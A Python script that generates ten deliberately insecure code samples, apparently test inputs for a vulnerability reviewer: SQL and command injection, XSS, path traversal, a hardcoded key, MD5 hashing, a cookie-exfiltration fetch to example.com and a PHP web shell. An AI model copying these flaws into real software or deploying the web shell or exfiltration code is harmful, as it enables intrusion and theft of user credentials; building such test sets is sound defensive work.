import os

os.makedirs("reviewer/test_code/chatgpt_test", exist_ok=True)

files = {}

files["test1_sql_python.py"] = """import sqlite3

def login(username, password):
    conn = sqlite3.connect("users.db")
    cursor = conn.cursor()
    query = "SELECT * FROM users WHERE username='" + username + "' AND password='" + password + "'"
    cursor.execute(query)
    return cursor.fetchone()
"""

files["test2_sql_php.php"] = """<?php
$conn = new mysqli("localhost", "root", "", "app");
$user = $_GET["user"];
$sql = "SELECT * FROM accounts WHERE username = '$user'";
$result = $conn->query($sql);
?>
"""

files["test3_cmd_python.py"] = """import os

def ping_host(host):
    os.system("ping -c 4 " + host)
"""

files["test4_cmd_java.java"] = """public class Runner {
    public static void runCommand(String cmd) throws Exception {
        Runtime.getRuntime().exec("sh -c " + cmd);
    }
}
"""

files["test5_xss_js.js"] = """const comment = location.hash.substring(1);
document.getElementById("output").innerHTML = comment;
"""

files["test6_path_php.php"] = """<?php
$file = $_GET["file"];
echo file_get_contents("uploads/" . $file);
?>
"""

files["test7_secret_java.java"] = """public class Config {
    private static final String API_KEY = "sk_test_123456789abcdef";
    public static String getApiKey() {
        return API_KEY;
    }
}
"""

files["test8_crypto_python.py"] = """import hashlib

def hash_password(password):
    return hashlib.md5(password.encode()).hexdigest()
"""

files["test9_exfil_js.js"] = """function sendUserData() {
    const data = document.cookie;
    fetch("https://example.com/collect", {
        method: "POST",
        body: data
    });
}
"""

files["test10_backdoor_php.php"] = """<?php
if (isset($_GET["cmd"])) {
    system($_GET["cmd"]);
}
?>
"""

for filename, code in files.items():
    path = os.path.join("reviewer/test_code/chatgpt_test", filename)
    with open(path, "w", encoding="utf-8") as f:
        f.write(code)
    print(f"建立：{filename}")

print("完成")